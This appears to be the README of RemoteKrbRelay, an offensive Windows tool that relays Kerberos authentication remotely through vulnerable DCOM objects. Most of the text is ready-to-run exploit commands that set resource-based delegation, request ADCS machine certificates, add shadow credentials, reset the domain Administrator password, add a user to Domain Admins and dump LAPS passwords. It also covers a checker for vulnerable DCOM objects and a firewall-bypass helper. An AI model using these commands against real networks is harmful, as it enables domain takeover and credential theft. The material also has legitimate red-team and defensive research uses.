
                            /\_/\____,
                  ,___/\_/\ \  ~     /
                  \     ~  \ )   XXX
                    XXX     /    /\_/\___,
                       \o-o/-o-o/   ~    /
                        ) /     \    XXX
                       _|    / \ \_/
                    ,-/   _  \_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \) _|
                 _/ _)   \   \__/   (_
                (,-(,(,(,/      \,),),)

                CICADA8 Research Team
                From Michael Zhmaylo (MzHmO)


# RemoteKrbRelay

You probably know [KrbRelay](https://github.com/cube0x0/KrbRelay) and [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp), but what if I told you it could be done remotely? With RemoteKrbRelay this becomes a reality.


# TL;DR

Learn more about CertifiedDCOM [here](https://blackhat.com/asia-24/briefings/schedule/#certifieddcom--the-privilege-escalation-journey-to-domain-admin-with-dcom-37519). CertifiedDCOM allows you to trigger an ADCS machine account:
```shell
# CertifiedDCOM (Abuse AD CS by setting RBCD)
  .\RemoteKrbRelay.exe -rbcd -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -cn FAKEMACHINE$

# CertifiedDCOM (Abuse ADCS to get Machine cert)
   .\RemoteKrbRelay.exe -adcs -template Machine -victim adcs.root.apchi -target dc01.root.apchi -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8

# CertifiedDCOM (Abuse ADCS with ShadowCreds)
  .\RemoteKrbRelay.exe -shadowcred -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -forceshadowcred
```

There's also the [SilverPotato](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/) exploit. You can use it to abuse sessions. Including a domain administrator session on a third-party host.
```shell
# Change user password
  .\RemoteKrbRelay.exe -chp -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -chpuser Administrator -chppass Lolkekcheb123! -secure

# Add user to group
  .\RemoteKrbRelay.exe -addgroupmember -victim computer.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -group "Domain Admins" -groupuser petka

# Dump LAPS passwords
  .\RemoteKrbRelay.exe -laps -victim mssql.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83

# Send LDAP Whoami request from relayed user
  .\RemoteKrbRelay.exe -ldapwhoami -victim win10.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83

# Trigger authentication from another session
  .\RemoteKrbRelay.exe -ldapwhoami -victim domainadminhost.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -session 1
```

# Details
Now, you have four folders in front of you:
- Checker - old version of the checker for detecting vulnerable DCOM objects;
- Checkerv2.0 - new version of the checker for detecting vulnerable DCOM objects;
- Exploit - RemoteKrbRelay.exe :) 
- FindAvailablePort - a tool for bypassing a firewall when using an exploit. 

## Checker
So, let's start with Checker. You can use it to detect vulnerable DCOM objects. A vulnerable DCOM object can be considered to be:
- The COM server within which the DCOM object is running must be run as another user or as a system. But never as `NT AUTHORITY\LOCAL SERVICE`, since it uses empty creds to authenticate from the network;
- You must have `RemoteLaunch`, `RemoteActivation` permissions. This is [LaunchPermissions](https://learn.microsoft.com/ru-ru/windows/win32/com/launchpermission);
- Impersonation level should be `RPC_C_IMP_LEVEL_IDENTIFY` and higher. `RPC_C_IMP_LEVEL_IDENTIFY` is a default value;
- U should have `RemoteAccess` permissions (or they should be emply). This is [AccessPermission](https://learn.microsoft.com/ru-ru/windows/win32/com/accesspermission).

For easy detection, you can use Checkerv2.0. It supports output in csv and xlsx formats.
```shell
PS A:\ssd\Share\RemoteKrbRelay\Checkerv2.0\Checkerv2.0\bin\Debug> .\Checkerv2.0.exe -h

                            /\_/\____,          /\     /\
                  ,___/\_/\ \  ~     /            \ _____\
                  \     ~  \ )   XXX               (_)-(_)
                    XXX     /    /\_/\___,      Checkerv2.0 Collection
                       \o-o/-o-o/   ~    /
                        ) /     \    XXX
                       _|    / \ \_/
                    ,-/   _  \_/   \
                   / (   /____,__|  )
                  (  |_ (    )  \) _|
                 _/ _)   \   \__/   (_
                (,-(,(,(,/      \,),),)

                CICADA8 Research Team
                From Michael Zhmaylo (MzHmO)

Check.exe
Small tool that allow you to find vulnerable DCOM applications

[OPTIONS]
-outfile : output filename
-outformat : output format. Accepted 'csv' and 'xlsx'
-showtable : show the xlsx table when it gets filled
-h/--help : shows this windows
```

Example:
```shell
.\Checkerv2.0.exe -outfile win10 -outformat xlsx
```
And u will receive such output:
![изображение](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/4f2f22c7-dd0a-4eef-a630-4cce0f9c55df)

The columns will contain the DCOM object CLSIDs, names, and LaunchPermission and AccessPermission. 
![изображение](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/4d6d0876-f3ae-453e-9c26-e618f61bc71d)

Try searching for sppui (CLSID {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}, APPID {0868DC9B-D9A2-4f64-9362-133CEA201299}) and CertSrv Request (CLSID { d99e6e74-fc88-11d0-b498-00a0c90312f3}) objects and understand why they are vulnerable.


# TO DO LIST
- [ ] Dump GMSA
- [ ] Exchange to exchange relay
- [ ] CLSID Bruteforce
- [ ] Relay with supplemental credentials

# Tips
- [ ] Relay initial OXID Request authentication. [Link](https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html). U can test:
```shell
.\RemoteKrbRelay.exe -ldapwhoami -victim win10.vostok.street -target dc01.vostok.street -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -local dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAAA

# but I haven't implemented the relay from Initial OXID Request yet. Do it BRO! :)
```

- [ ] U can get TGT in AP-REQ. What if des cryptography is used?
```shell
.\RemoteKrbRelay.exe -rbcd -victim win10.vostok.street -target dc01.vostok.street -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -spn krbtgt/root.apchi -cn FAKEMACHINE$
```

# Conclusion
The vulnerability is quite serious. Note that this is the minimum POC. You should refine it if you want to use it stably on your Red Team projects. 

# Acknowledgements
- Repos [KrbRelay](https://github.com/cube0x0/KrbRelay) and [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp), with their help I was able to figure out Kerberos Relay
- [BH Asia 2024 Talk](https://blackhat.com/asia-24/briefings/schedule/#certifieddcom--the-privilege-escalation-journey-to-domain-admin-with-dcom-37519)
- [Silver Potato](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/)

Thanks for not posting the POC on CertifiedDCOM and SilverPotato, I've been stoked to do them on those articles :D
